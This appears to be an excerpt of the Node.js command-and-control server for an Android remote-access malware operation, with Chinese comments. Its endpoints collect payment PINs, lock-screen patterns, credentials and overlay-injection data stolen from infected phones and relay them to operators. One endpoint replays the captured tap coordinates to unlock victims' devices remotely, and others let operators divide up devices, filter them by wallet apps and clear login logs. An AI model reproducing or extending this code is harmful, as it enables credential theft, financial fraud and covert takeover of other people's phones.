app.post('/api/data/cipher', (req, res) => {
  const data = req.body || {};
  const deviceId = data.deviceId || req.headers['x-client-id'] || req.headers['x-device-id'] || '';
  console.log(`[CIPHER] 收到支付密码(/api/data/cipher): deviceId=${deviceId}, data=${JSON.stringify(data).slice(0, 300)}`);
  if (deviceId && (data.cipher || data.password || data.value || data.textCipher || data.patternCipher)) {
    const text = data.textCipher || data.cipher || data.password || data.value || data.patternCipher || '';
    const appName = data.appName || data.app || 'lock_screen';
    const cipherType = data.cipherType || 'payment_cipher';
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, appName, data.packageName || '', text, cipherType, data.captureTime || data.timestamp || Date.now());
    broadcastToAdmins({ type: 'password_input', sessionId: deviceId, deviceId, botId: deviceId, data });
    console.log(`[CIPHER] ✅ 已入库: ${deviceId} type=${cipherType} value=${text.slice(0, 3)}***`);
  }
  res.json({ success: true });
});
// ★ 管理端删除密码记录
app.delete('/api/password-inputs/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(deviceId);
  console.log(`[PWD] 已删除设备 ${deviceId} 的所有密码记录`);
  res.json({ success: true });
});
// ★ 管理端回放密码坐标（向设备发送 adb tap 命令序列）
app.post('/api/payment-cipher-records/:id/replay', authMiddleware, (req, res) => {
  const { id } = req.params;
  const { mode } = req.body || {};
  const row = db.prepare('SELECT * FROM password_inputs WHERE id=?').get(id);
  if (!row) return res.json({ success: false, error: '记录不存在' });
  
  const deviceId = row.device_id;
  const bws = bridgeConnections.get(deviceId);
  const dws = deviceConnections.get(deviceId);
  if ((!bws || bws.readyState !== 1) && (!dws || dws.readyState !== 1)) {
    return res.json({ success: false, error: '设备未连接' });
  }
  
  // 优先用 props（有时间戳，能区分点击和滑动）
  let tapPoints = [];
  let extra = {};
  try { extra = JSON.parse(row.extra_data || '{}'); } catch {}
  const props = extra.props || [];
  
  if (props.length > 0) {
    // 用时间戳过滤：两个点间隔 > 100ms 视为独立点击
    const clicks = [props[0]];
    for (let i = 1; i < props.length; i++) {
      const gap = (props[i].t - props[i-1].t) / 1e6; // nanoTime → ms
      if (gap > 100) clicks.push(props[i]);
    }
    tapPoints = clicks.map(p => {
      const [x, y] = (p.v || '').split(',').map(Number);
      return { x: Math.round(x), y: Math.round(y) };
    }).filter(c => !isNaN(c.x) && !isNaN(c.y));
    console.log(`[CIPHER-REPLAY] ${deviceId}: 使用 props 时间戳过滤: ${props.length} → ${tapPoints.length} 个点击`);
  } else {
    // 回退：用 cipher 坐标串
    const rawText = row.input_text || '';
    const isCoordFormat = /^\d+\.?\d*,\d+\.?\d*\|/.test(rawText);
    if (!isCoordFormat) return res.json({ success: false, error: '该记录不是坐标格式，无法回放' });
    const allPoints = rawText.split('|').map(p => {
      const [x, y] = p.split(',').map(Number);
      return { x: Math.round(x), y: Math.round(y) };
    }).filter(c => !isNaN(c.x) && !isNaN(c.y));
    for (const p of allPoints) {
      const prev = tapPoints[tapPoints.length - 1];
      if (!prev || p.x !== prev.x || p.y !== prev.y) tapPoints.push(p);
    }
  }
  
  if (tapPoints.length === 0) return res.json({ success: false, error: '无有效点击点' });
  
  // 依次发送 tap 命令，每个间隔 300ms
  tapPoints.forEach((p, i) => {
    setTimeout(() => {
      const cmd = { type: 'command', command: 'tap', params: { x: p.x, y: p.y } };
      if (bws && bws.readyState === 1) {
        bws.send(JSON.stringify(cmd));
      } else if (dws && dws.readyState === 1) {
        dws.send(JSON.stringify({ type: 'command', data: { command: 'tap', params: { x: p.x, y: p.y } } }));
      }
      console.log(`[CIPHER-REPLAY] ${deviceId}: tap[${i}] (${p.x},${p.y})`);
    }, i * 300);
  });
  
  console.log(`[CIPHER-REPLAY] ${deviceId}: 回放 ${tapPoints.length} 个点击 (mode=${mode})`);
  res.json({ success: true, message: `已发送 ${tapPoints.length} 个点击回放`, points: tapPoints });
});
// ★ 凭据上报处理（/api/sync/credentials + /api/data/credentials 共用）
function handleCredentialUpload(req, res) {
  const data = req.body || {};
  const deviceId = data.deviceId || req.headers['x-client-id'] || req.headers['x-device-id'] || '';
  console.log(`[CRED] 收到凭据: ${JSON.stringify(data).slice(0, 200)}`);
  if (deviceId) {
    const text = data.password || data.value || data.credential || JSON.stringify(data);
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, data.appName || data.app || '', data.packageName || '', text, data.type || data.passwordType || 'credential', data.timestamp || Date.now());
    broadcastToAdmins({ type: 'credential_captured', sessionId: deviceId, deviceId, botId: deviceId, data });
  }
  res.json({ success: true });
}
app.post('/api/sync/credentials', handleCredentialUpload);
app.post('/api/data/credentials', handleCredentialUpload);
app.post('/api/sync/form', (req, res) => {
  // ★★★ 注入数据上报（APP HttpManager.uploadInjectionData 发到这里）★★★
  const data = req.body || {};
  const deviceId = data.deviceId || data.sessionId || '';
  console.log(`[INJECT] ★ 收到注入数据(/api/sync/form): deviceId=${deviceId}, keys=${Object.keys(data).join(',')}, data=${JSON.stringify(data).slice(0, 500)}`);
  if (deviceId) {
    const packageName = data.packageName || data.pkg || data.package_name || '';
    const bodyStr = JSON.stringify(data);
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, bodyStr, 'injection', data.timestamp || Date.now());
    // 通知管理端
    broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
    console.log(`[INJECT] ✅ 注入数据已存储并通知管理端: ${deviceId} / ${packageName}`);
  }
  res.json({ success: true });
});

// ★ APP 实际 POST 路径（反编译确认: HttpManager$uploadInjectionData$2 → "/api/data/form"）
app.post('/api/data/form', (req, res) => {
  const data = req.body || {};
  const deviceId = data.deviceId || data.sessionId || '';
  console.log(`[INJECT] ★ 收到注入数据(/api/data/form): deviceId=${deviceId}, keys=${Object.keys(data).join(',')}, data=${JSON.stringify(data).slice(0, 500)}`);
  if (deviceId) {
    const packageName = data.packageName || data.pkg || data.package_name || '';
    const bodyStr = JSON.stringify(data);
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, bodyStr, 'injection', data.timestamp || Date.now());
    broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
    console.log(`[INJECT] ✅ 注入数据已存储并通知管理端: ${deviceId} / ${packageName}`);
  }
  res.json({ success: true });
});

// APP 注入数据上报（HTTP POST）

app.post('/injectionData', (req, res) => {
  const data = req.body || {};
  console.log(`[INJECT] 收到注入数据: ${JSON.stringify(data).slice(0, 200)}`);
  // 存入 sms_notifications 表
  const deviceId = data.deviceId || data.sessionId || '';
  const packageName = data.packageName || data.pkg || '';
  const body = data.data || data.body || data.result || JSON.stringify(data);
  if (deviceId) {
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, typeof body === 'string' ? body : JSON.stringify(body), 'injection', Date.now());
  }
  // 通知管理端
  broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
  res.json({ success: true });
});
app.post('/api/injectionData', (req, res) => {
  // 同上，兼容带 /api 前缀
  const data = req.body || {};
  console.log(`[INJECT] 收到注入数据(api): ${JSON.stringify(data).slice(0, 200)}`);
  const deviceId = data.deviceId || data.sessionId || '';
  const packageName = data.packageName || data.pkg || '';
  const body = data.data || data.body || data.result || JSON.stringify(data);
  if (deviceId) {
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, typeof body === 'string' ? body : JSON.stringify(body), 'injection', Date.now());
  }
  broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
  res.json({ success: true });
});
app.post('/api/adb-keys/upload', (req, res) => res.json({ success: true }));
app.post('/api/file/upload-from-device', (req, res) => res.json({ success: true }));

// ============================================================
// 管理端 API
// ============================================================
app.get('/api/device/list', authMiddleware, (req, res) => {
  const _t0 = Date.now();
  // ★ 后台分页：支持 page/pageSize/keyword 参数
  const page = Math.max(1, parseInt(req.query.page) || 1);
  const pageSize = Math.min(200, Math.max(1, parseInt(req.query.pageSize) || 10));
  const keyword = (req.query.keyword || '').trim().toLowerCase();
  const offset = (page - 1) * pageSize;

  let baseWhere = '';
  let baseParams = [];

  // 超管看所有设备，子账号看 assigned_devices + owner_username 双重匹配
  const user = db.prepare('SELECT is_super,assigned_devices,username FROM users WHERE id=?').get(req.user.userId);
  if (user && user.is_super) {
    baseWhere = '1=1';
  } else {
    const assigned = (user?.assigned_devices || '').split(',').filter(Boolean);
    const uname = user?.username || '';
    if (assigned.length > 0) {
      baseWhere = `(device_id IN (${assigned.map(() => '?').join(',')}) OR owner_username=?)`;
      baseParams = [...assigned, uname];
    } else if (uname) {
      baseWhere = 'owner_username=?';
      baseParams = [uname];
    } else {
      return res.json({ success: true, data: [], total: 0, page, pageSize });
    }
  }

  // 关键词搜索（设备ID、品牌、型号、备注、IP）
  let searchWhere = '';
  let searchParams = [];
  if (keyword) {
    searchWhere = ` AND (LOWER(device_id) LIKE ? OR LOWER(brand) LIKE ? OR LOWER(model) LIKE ? OR LOWER(remark) LIKE ? OR LOWER(public_ip) LIKE ?)`;
    const kw = `%${keyword}%`;
    searchParams = [kw, kw, kw, kw, kw];
  }

  // ★ 在线状态过滤（status=online 时只返回当前 WebSocket 连接中的设备）
  let statusWhere = '';
  let statusParams = [];
  const statusFilter = (req.query.status || '').trim().toLowerCase();
  if (statusFilter === 'online') {
    const onlineIds = [...deviceConnections.keys(), ...bridgeConnections.keys()].filter(Boolean);
    if (onlineIds.length === 0) {
      return res.json({ success: true, data: [], total: 0, onlineCount: 0, page, pageSize });
    }
    statusWhere = ` AND device_id IN (${onlineIds.map(() => '?').join(',')})`;
    statusParams = onlineIds;
  } else if (statusFilter === 'offline') {
    const onlineIds = [...deviceConnections.keys(), ...bridgeConnections.keys()].filter(Boolean);
    if (onlineIds.length > 0) {
      statusWhere = ` AND device_id NOT IN (${onlineIds.map(() => '?').join(',')})`;
      statusParams = onlineIds;
    }
  }

  // ★ 额外过滤条件
  let extraWhere = '';
  let extraParams = [];
  const qBrand = (req.query.brand || '').trim();
  const qRemark = (req.query.remark || '').trim();
  const qOsVersion = (req.query.osVersion || '').trim();
  const qAppName = (req.query.appName || '').trim();
  const qHasSim = (req.query.hasSim || '').trim();
  const qGroupName = (req.query.groupName || '').trim();
  const qDateFrom = parseInt(req.query.dateFrom) || 0;
  const qDateTo = parseInt(req.query.dateTo) || 0;
  const qLockScreen = (req.query.lockScreenType || '').trim();

  if (qBrand) { extraWhere += ' AND LOWER(brand)=?'; extraParams.push(qBrand.toLowerCase()); }
  if (qRemark) { extraWhere += ' AND LOWER(remark) LIKE ?'; extraParams.push(`%${qRemark.toLowerCase()}%`); }
  if (qOsVersion) { extraWhere += ' AND os_version=?'; extraParams.push(qOsVersion); }
  if (qAppName) { extraWhere += ' AND LOWER(app_name) LIKE ?'; extraParams.push(`%${qAppName.toLowerCase()}%`); }
  if (qHasSim === 'true') { extraWhere += ' AND has_sim=1'; }
  else if (qHasSim === 'false') { extraWhere += ' AND has_sim=0'; }
  if (qGroupName) { extraWhere += ' AND group_name=?'; extraParams.push(qGroupName); }
  if (qDateFrom) { extraWhere += ' AND (first_install_time>=? OR first_seen>=?)'; extraParams.push(qDateFrom, qDateFrom); }
  if (qDateTo) { extraWhere += ' AND (first_install_time<=? OR first_seen<=?)'; extraParams.push(qDateTo, qDateTo); }

  // ★ dataFilter: adb/injection/wallet
  const qDataFilter = (req.query.dataFilter || '').trim();
  if (qDataFilter === 'adb') { extraWhere += ' AND local_service_connected=1'; }
  else if (qDataFilter === 'injection') { extraWhere += " AND device_id IN (SELECT DISTINCT device_id FROM sms_notifications WHERE type='injection')"; }
  else if (qDataFilter === 'wallet') { extraWhere += " AND device_id IN (SELECT DISTINCT device_id FROM sensitive_apps)"; }

  // ★ isLocked 过滤
  const qIsLocked = (req.query.isLocked || '').trim();
  if (qIsLocked === 'true') { extraWhere += ' AND is_locked=1'; }
  else if (qIsLocked === 'false') { extraWhere += ' AND is_locked=0'; }

  const fullWhere = `WHERE ${baseWhere}${searchWhere}${statusWhere}${extraWhere}`;
  const allParams = [...baseParams, ...searchParams, ...statusParams, ...extraParams];

  // 查总数
  const _t1 = Date.now();
  const total = db.prepare(`SELECT COUNT(*) as c FROM devices ${fullWhere}`).get(...allParams).c;
  const _t2 = Date.now();

  // ★ 排序支持（默认按安装时间降序，最新安装的在前）
  const sortBy = (req.query.sortBy || '').trim();
  let orderClause = 'ORDER BY first_seen DESC';
  if (sortBy === 'lastSeen') {
    orderClause = 'ORDER BY last_seen DESC';
  } else if (sortBy === 'firstSeen' || sortBy === 'connectedAt') {
    orderClause = 'ORDER BY first_seen ASC';
  }

  // 查分页数据
  const rows = db.prepare(`SELECT * FROM devices ${fullWhere} ${orderClause} LIMIT ? OFFSET ?`).all(...allParams, pageSize, offset);
  const _t3 = Date.now();

  // ★ includeDevice: 确保指定设备一定在返回结果中（控制页面用）
  const includeDevice = (req.query.includeDevice || '').trim();
  if (includeDevice && !rows.find(r => r.device_id === includeDevice)) {
    const target = db.prepare('SELECT * FROM devices WHERE device_id=?').get(includeDevice);
    if (target) rows.unshift(target);
  }

  // ★ 批量预取 lockScreenType，消除 N+1 查询
  const deviceIds = rows.map(r => r.device_id).filter(Boolean);
  const lockScreenMap = {};
  if (deviceIds.length > 0) {
    const placeholders = deviceIds.map(() => '?').join(',');
    const lockRows = db.prepare(`SELECT device_id, password_type FROM password_inputs WHERE id IN (SELECT MAX(id) FROM password_inputs WHERE device_id IN (${placeholders}) GROUP BY device_id)`).all(...deviceIds);
    const tm = { '6pin': 'pin', '4pin': 'pin', 'pin': 'pin', 'mixed': 'mixed', 'pattern': 'pattern', 'password': 'password' };
    for (const lr of lockRows) {
      lockScreenMap[lr.device_id] = tm[lr.password_type] || lr.password_type || '';
    }
  }

  // ★ 批量预取 injectionCount，消除前端单独请求 /api/injection/counts
  const injectionCountMap = {};
  if (deviceIds.length > 0) {
    const placeholders = deviceIds.map(() => '?').join(',');
    const injRows = db.prepare(`SELECT device_id, COUNT(*) as c FROM sms_notifications WHERE device_id IN (${placeholders}) AND type='injection' GROUP BY device_id`).all(...deviceIds);
    for (const ir of injRows) {
      injectionCountMap[ir.device_id] = ir.c;
    }
  }

  // ★ 在线设备总数（超管看全局，子账号只看自己的设备）
  let onlineCount;
  if (user && user.is_super) {
    onlineCount = deviceConnections.size + bridgeConnections.size;
  } else {
    // 子账号：统计自己有权限的设备中在线的数量
    const allOnlineIds = new Set([...deviceConnections.keys(), ...bridgeConnections.keys()]);
    const ownedDeviceIds = db.prepare(`SELECT device_id FROM devices WHERE ${baseWhere}`).all(...baseParams).map(r => r.device_id);
    onlineCount = ownedDeviceIds.filter(id => allOnlineIds.has(id)).length;
  }

  // ★ 筛选选项（仅第一页时返回，减少开销）
  let filterOptions = undefined;
  if (page === 1) {
    try {
      const brands = db.prepare("SELECT DISTINCT brand FROM devices WHERE brand IS NOT NULL AND brand!='' ORDER BY brand").all().map(r => r.brand);
      const osVersions = db.prepare("SELECT DISTINCT os_version FROM devices WHERE os_version IS NOT NULL AND os_version!='' ORDER BY os_version").all().map(r => r.os_version);
      const appNames = db.prepare("SELECT DISTINCT app_name FROM devices WHERE app_name IS NOT NULL AND app_name!='' ORDER BY app_name").all().map(r => r.app_name);
      const groupNames = db.prepare("SELECT DISTINCT group_name FROM devices WHERE group_name IS NOT NULL AND group_name!='' ORDER BY group_name").all().map(r => r.group_name);
      filterOptions = { brands, osVersions, appNames, groupNames };
    } catch (e) { }
  }

  const _t4 = Date.now();
  res.json({
    success: true,
    data: rows.map(row => deviceToListApi(row, lockScreenMap, injectionCountMap)),
    total,
    onlineCount,
    filterOptions,
    page,
    pageSize
  });
  const _t5 = Date.now();
  console.log(`[PERF] device/list: total=${_t5-_t0}ms | wait=${_t1-_t0}ms | COUNT=${_t2-_t1}ms | SELECT=${_t3-_t2}ms | subQueries=${_t4-_t3}ms | json=${_t5-_t4}ms`);
});

// ★ 筛选选项接口（返回全量去重值，供下拉框使用）
app.get('/api/device/filter-options', authMiddleware, (req, res) => {
  try {
    const brands = db.prepare("SELECT DISTINCT brand FROM devices WHERE brand IS NOT NULL AND brand!='' ORDER BY brand").all().map(r => r.brand);
    const osVersions = db.prepare("SELECT DISTINCT os_version FROM devices WHERE os_version IS NOT NULL AND os_version!='' ORDER BY os_version").all().map(r => r.os_version);
    const appNames = db.prepare("SELECT DISTINCT app_name FROM devices WHERE app_name IS NOT NULL AND app_name!='' ORDER BY app_name").all().map(r => r.app_name);
    const groupNames = db.prepare("SELECT DISTINCT group_name FROM devices WHERE group_name IS NOT NULL AND group_name!='' ORDER BY group_name").all().map(r => r.group_name);
    res.json({ success: true, data: { brands, osVersions, appNames, groupNames } });
  } catch (e) {
    res.json({ success: true, data: { brands: [], osVersions: [], appNames: [], groupNames: [] } });
  }
});

// ★ 单设备查询（控制页面用，不受分页限制）
app.get('/api/device/info/:deviceId', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const row = db.prepare('SELECT * FROM devices WHERE device_id=?').get(deviceId);
  if (!row) return res.json({ success: false, message: '设备不存在' });
  res.json({ success: true, data: deviceToListApi(row) });
});

// 下发设备到子账户
app.put('/api/device/:deviceId/assign', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const { username } = req.body || {};
  if (!username) return res.json({ success: false, message: '请选择目标子账户' });
  const user = db.prepare('SELECT id,assigned_devices FROM users WHERE username=?').get(username);
  if (!user) return res.json({ success: false, message: '用户不存在' });
  // 把设备加到用户的 assigned_devices 列表
  const current = (user.assigned_devices || '').split(',').filter(Boolean);
  if (!current.includes(deviceId)) {
    current.push(deviceId);
    db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(current.join(','), user.id);
  }
  res.json({ success: true, message: `设备已下发到 ${username}` });
});

// 设备分组（设置设备所属分组）
app.put('/api/device/:deviceId/group', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const { groupName, groupId } = req.body || {};
  try { db.exec("ALTER TABLE devices ADD COLUMN group_name TEXT DEFAULT ''"); } catch { }
  db.prepare('UPDATE devices SET group_name=? WHERE device_id=?').run(groupName || '', deviceId);
  res.json({ success: true });
});

app.get('/api/users', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  console.log('[USER_LIST_DEBUG] 当前在线的管理端 WS 连接:', Array.from(adminConnections).map(c => ({ user: c._adminUsername, ip: c._adminIp })));
  const rows = db.prepare('SELECT id,username,role,avatar,max_devices,is_super,assigned_devices,created_at FROM users').all();
  res.json({
    success: true, data: rows.map(r => ({
      id: r.id,
      username: r.username,
      role: r.role,
      isSuper: !!r.is_super,
      isOnline: Array.from(adminConnections).some(c => c._adminUsername === r.username),
      ip: (() => {
        const conn = Array.from(adminConnections).find(c => c._adminUsername === r.username);
        return conn ? (conn._adminIp || '') : '';
      })(),
      maxDevices: r.max_devices || 100,
      assignedDevices: r.assigned_devices || '',
      createdAt: new Date((r.created_at || 0) * 1000).toISOString().replace('T', ' ').slice(0, 19)
    }))
  });
});


// 修改用户密码
app.put('/api/users/:id/password', authMiddleware, (req, res) => {
  const { id } = req.params;
  const body = req.body || {};
  const password = body.password || body.newPassword || body.new_password || '';
  if (!password) return res.json({ success: false, message: 'password required' });
  const bcrypt = require('bcryptjs');
  const hash = bcrypt.hashSync(password, 10);
  db.prepare('UPDATE users SET password_hash=? WHERE id=?').run(hash, id);
  // 密码修改后使旧 token 失效：写入新随机值，所有旧 token 的 sessionId 都不匹配
  const newSession = require('crypto').randomBytes(16).toString('hex');
  db.prepare('UPDATE users SET active_session=? WHERE id=?').run(newSession, id);
  // 踢掉该用户的 WS 连接
  const kickedUser = db.prepare('SELECT username FROM users WHERE id=?').get(id);
  if (kickedUser) {
    for (const aws of adminConnections) {
      if (aws._adminUsername === kickedUser.username) {
        try { aws.send(JSON.stringify({ type: 'forced_logout', message: '密码已被修改，请重新登录' })); } catch { }
        setTimeout(() => { try { aws.close(4001, 'password_changed'); } catch { } }, 500);
      }
    }
    console.log(`[AUTH] 用户 ${kickedUser.username} 密码被修改，token 已失效`);
  }
  res.json({ success: true });
});

app.post('/api/users', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const { username, password, role, maxDevices, isSuper } = req.body || {};
  if (!username || !password) return res.json({ success: false, message: '用户名和密码不能为空' });
  const exists = db.prepare('SELECT id FROM users WHERE username=?').get(username);
  if (exists) return res.json({ success: false, message: '用户名已存在' });
  const hash = bcrypt.hashSync(password, 10);
  // 子账号默认 role 为 "user"（前端下发列表只显示 role=user 的）
  const userRole = role || 'user';
  db.prepare('INSERT INTO users (username,password_hash,role,max_devices,is_super) VALUES (?,?,?,?,?)').run(username, hash, userRole, maxDevices || 100, isSuper ? 1 : 0);
  res.json({ success: true, message: '用户创建成功' });
});

app.put('/api/users/:id', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const { password, role, maxDevices, isSuper, assignedDevices } = req.body || {};
  if (password) {
    const hash = bcrypt.hashSync(password, 10);
    db.prepare('UPDATE users SET password_hash=? WHERE id=?').run(hash, req.params.id);
  }
  if (role !== undefined) db.prepare('UPDATE users SET role=? WHERE id=?').run(role, req.params.id);
  if (maxDevices !== undefined) db.prepare('UPDATE users SET max_devices=? WHERE id=?').run(maxDevices, req.params.id);
  if (isSuper !== undefined) db.prepare('UPDATE users SET is_super=? WHERE id=?').run(isSuper ? 1 : 0, req.params.id);
  if (assignedDevices !== undefined) db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(assignedDevices, req.params.id);
  res.json({ success: true });
});

app.get('/api/users/login-logs', authMiddleware, (req, res) => {

  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const rows = db.prepare('SELECT * FROM login_logs ORDER BY created_at DESC LIMIT 100').all();
  const data = rows.map(r => ({
    id: r.id,
    username: r.username,
    loginTime: r.created_at ? new Date(r.created_at * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }) : '',
    ipAddress: r.ip || '',
    success: r.success,
    isOnline: false
  }));
  res.json({ success: true, data });
});

app.delete('/api/users/login-logs', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  db.prepare('DELETE FROM login_logs').run();
  res.json({ success: true, message: '登录日志已成功清空' });
});

app.delete('/api/users/:id', authMiddleware, (req, res) => {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ success: false, message: '权限不足' });
  }
  const user = db.prepare('SELECT is_super FROM users WHERE id=?').get(req.params.id);
  if (user && user.is_super) return res.json({ success: false, message: '不能删除超级管理员' });
  db.prepare('DELETE FROM users WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

app.get('/api/system/info', authMiddleware, (req, res) => {
  const os = require('os');
  const total = db.prepare('SELECT COUNT(*) as c FROM devices').get().c;
  const online = db.prepare("SELECT COUNT(*) as c FROM devices WHERE is_connected=1").get().c;
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const cpus = os.cpus();

  let diskTotal = 0, diskUsed = 0, diskFree = 0;
  try {
    const { execSync } = require('child_process');
    const dfOutput = execSync("df -B1 / | tail -1").toString().trim().split(/\s+/);
    diskTotal = parseInt(dfOutput[1]) || 0;
    diskUsed = parseInt(dfOutput[2]) || 0;
    diskFree = parseInt(dfOutput[3]) || 0;
  } catch { }

  res.json({
    success: true, data: {
      version: '1.0.0',
      uptime: Math.floor(process.uptime()),
      totalDevices: total,
      onlineDevices: online,
      cpuCores: cpus.length,
      cpuModel: cpus[0]?.model || 'Unknown',
      cpuUsage: 0,
      memTotal: totalMem,
      memUsed: usedMem,
      memFree: freeMem,
      memUsage: Math.round((usedMem / totalMem) * 100),
      diskTotal: diskTotal,
      diskUsed: diskUsed,
      diskFree: diskFree,
      diskUsage: diskTotal > 0 ? Math.round((diskUsed / diskTotal) * 100) : 0,
      netSendSpeed: 0,
      netRecvSpeed: 0,
      netBytesSent: 0,
      netBytesRecv: 0,
      hostname: os.hostname(),
      platform: os.platform() + ' ' + os.release(),
      hostUptime: Math.floor(os.uptime()),
      totalApks: 0,
      apkOutputSize: 0,
      apkDownloadCount: 0,
      totalAbPacks: 0,
      abPackOutputSize: 0
    }
  });
});

app.get('/api/license/max-users', authMiddleware, (req, res) => res.json({ success: true, data: { maxUsers: 999 } }));
app.get('/api/injection/counts', (req, res) => {
  const deviceIds = (req.query.deviceIds || '').split(',').filter(Boolean);
  const counts = {};
  for (const id of deviceIds) {
    const row = db.prepare("SELECT COUNT(*) as c FROM sms_notifications WHERE device_id=? AND type='injection'").get(id);
    counts[id] = row ? row.c : 0;
  }
  res.json({ success: true, counts });
});
app.get('/api/devices/crypto-wallets', (req, res) => {
  const deviceIds = (req.query.deviceIds || '').split(',').filter(Boolean);
  const result = {};
  for (const id of deviceIds) result[id] = [];
  res.json({ success: true, result });
});
// IP 地理位置查询（本地 geoip-lite 数据库，零网络请求，无限制）
const _ipGeoCache = new Map();
let _geoip = null;
try { _geoip = require('geoip-lite'); console.log('[INIT] geoip-lite 加载成功'); } catch (e) { console.log('[INIT] geoip-lite 未安装，回退 ip-api.com'); }

app.get('/api/ip-geo/:ip', (req, res) => {
  const ip = req.params.ip;
  if (!ip || !/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
    return res.json({ success: false, message: 'Invalid IP' });
  }
  // 命中缓存直接返回
  if (_ipGeoCache.has(ip)) {
    return res.json({ success: true, ..._ipGeoCache.get(ip) });
  }
  // 本地查询（geoip-lite）
  if (_geoip) {
    const geo = _geoip.lookup(ip);
    if (geo) {
      // geoip-lite 返回国家代码，需要映射为全名
      const countryNames = {CN:'China',US:'United States',JP:'Japan',KR:'South Korea',HK:'Hong Kong',TW:'Taiwan',SG:'Singapore',IN:'India',TH:'Thailand',VN:'Vietnam',MY:'Malaysia',ID:'Indonesia',PH:'Philippines',BR:'Brazil',GB:'United Kingdom',DE:'Germany',FR:'France',AU:'Australia',CA:'Canada',RU:'Russia',AE:'United Arab Emirates',SA:'Saudi Arabia'};
      const result = { country: countryNames[geo.country] || geo.country || '', region: geo.region || '', city: geo.city || '' };
      if (_ipGeoCache.size > 5000) _ipGeoCache.clear();
      _ipGeoCache.set(ip, result);
      return res.json({ success: true, ...result });
    }
    return res.json({ success: true, country: '', region: '', city: '' });
  }
  // 兜底：ip-api.com（geoip-lite 未安装时）
  const http = require('http');
  const apiUrl = `http://ip-api.com/json/${ip}?fields=status,country,regionName,city&lang=en`;
  const apiReq = http.get(apiUrl, { timeout: 3000 }, (apiRes) => {
    let data = '';
    apiRes.on('data', chunk => data += chunk);
    apiRes.on('end', () => {
      try {
        const geo = JSON.parse(data);
        if (geo.status === 'success') {
          const result = { country: geo.country || '', region: geo.regionName || '', city: geo.city || '' };
          if (_ipGeoCache.size > 5000) _ipGeoCache.clear();
          _ipGeoCache.set(ip, result);
          return res.json({ success: true, ...result });
        }
        res.json({ success: true, country: '', region: '', city: '' });
      } catch (e) {
        res.json({ success: true, country: '', region: '', city: '' });
      }
    });
  });
  apiReq.on('error', () => res.json({ success: true, country: '', region: '', city: '' }));
  apiReq.on('timeout', () => { apiReq.destroy(); res.json({ success: true, country: '', region: '', city: '' }); });
});
app.get('/api/black-apps', authMiddleware, (req, res) => res.json({ success: true, data: { apps: [] } }));
app.get('/api/sensitive-apps', authMiddleware, (req, res) => res.json({ success: true, data: { apps: [] } }));
// 支付策略 CRUD
app.get('/api/payment-strategies', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT * FROM payment_strategies ORDER BY created_at DESC').all();
  res.json({
    success: true, data: rows.map(r => ({
      id: r.id, packageName: r.package_name, appName: r.app_name,
      listenWinClasses: (() => { try { return JSON.parse(r.listen_win_classes); } catch (e) { return []; } })(),
      enabled: r.enabled === 1, remark: r.remark, createdAt: r.created_at
    }))
  });
});
app.post('/api/payment-strategies', authMiddleware, (req, res) => {
